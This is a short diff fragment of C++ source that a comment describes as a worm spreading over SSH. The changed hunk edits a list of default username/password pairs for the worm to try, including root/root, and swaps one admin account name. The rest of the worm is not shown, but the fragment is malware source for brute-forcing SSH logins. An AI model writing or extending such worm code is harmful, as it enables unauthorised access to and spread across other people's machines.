@@ -43,7 +43,7 @@ public:
 
     // Function to return a list of SSH credentials to try
     std::vector<std::pair<std::string, std::string>> get_credentials() {
-        return {{"user", "user"}, {"root", "root"}, {"yadmin", "yadmin"}};  // Default credentials
+        return {{"user", "user"}, {"root", "root"}, {"fadmin", "fadmin"}};  // Default credentials
     }
 
     // Function to spread the worm using SSH
